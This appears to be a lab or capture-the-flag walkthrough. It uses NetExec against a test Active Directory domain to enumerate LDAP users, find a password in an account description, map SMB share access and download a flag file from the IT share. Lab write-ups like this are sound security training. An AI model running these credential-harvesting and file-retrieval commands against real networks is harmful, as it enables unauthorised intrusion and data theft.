### Mission 1: Enumerate Active Directory via LDAP & Mine User Descriptions

**Blueprint:** `nxc ldap [Target IP] -u [User] -p [Password] --base-dn [Base DN] --users`

**Command:** ```bash
nxc ldap 192.168.56.20 -u student -p 'password1234' --base-dn "DC=PENTESTLAB,DC=local" --users

```

**Analysis & Findings:** By authenticating against the LDAP service on port 389, we dumped the object attributes for domain users. Active Directory environments frequently suffer from informational leaks where administrators inadvertently expose cleartext passwords or configurations in account descriptions.

* **Compromised Account Found:** `svc_app`  
* **Exposed Credential:** `AppServ1ce!` (Leaked directly inside the description field: `Application Service - Password: AppServ1ce!`)

---

### Mission 2: Authenticate via SMB and Map Network Share Permissions

**Blueprint:** `nxc smb [Target IP] -u [User] -p [Password] --shares`

**Command:** ```bash
nxc smb 192.168.56.20 -u svc_app -p 'AppServ1ce!' --shares

```

**Explanation:** * `smb`: Switches NetExec to the Server Message Block protocol module (Port 445).

* `-u svc_app -p 'AppServ1ce!'`: Uses the newly discovered service account credentials to establish an authenticated session.
* `--shares`: Queries the remote IPC endpoint to enumerate all available directory shares and checks our current access tokens against them.

**Key Discovery:** The `svc_app` account holds explicit **READ** access across several high-value internal folders, including `Finance`, `FlagShare`, `HR`, `IT`, and `IT-Share`.

---

### Mission 3: Troubleshoot Syntax and Isolate the Target Share

When attempting to check file structures, chaining multiple directories incorrectly or using global flags can break NetExec's argument parser, leading to `STATUS_ACCESS_DENIED` or `STATUS_BAD_NETWORK_NAME`.

The correct approach is to isolate and query a single valid share directly.

**Command:** ```bash
nxc smb 192.168.56.20 -u svc_app -p 'AppServ1ce!' --share IT --dir

```

**Explanation:** * `--share IT`: Focuses the scope exclusively to the path mapped by the `IT` share.
* `--dir`: Instructs NetExec to list the root directory contents of that specific share.

**Directory Contents:** * `db_connections.txt`
* `flag_t2.txt`
* `passwords.txt`
* `vpn_config.txt`

---

### Mission 4: Exfiltrate the Target File and Recover the Flag

**Command:** ```bash
nxc smb 192.168.56.20 -u svc_app -p 'AppServ1ce!' --share IT --get-file flag_t2.txt flag_t2.txt

```

**Explanation:** * `--get-file flag_t2.txt flag_t2.txt`: Downloads the remote file from the authenticated share path and writes it directly to your local working directory on Kali Linux.

```bash
cat flag_t2.txt

```

**Recovered Flag:** `FLAG_M2_T2{876f7f1cc534f1a69c66cfc89d66371ca83f8d30ad6487a2829d2058db71}`
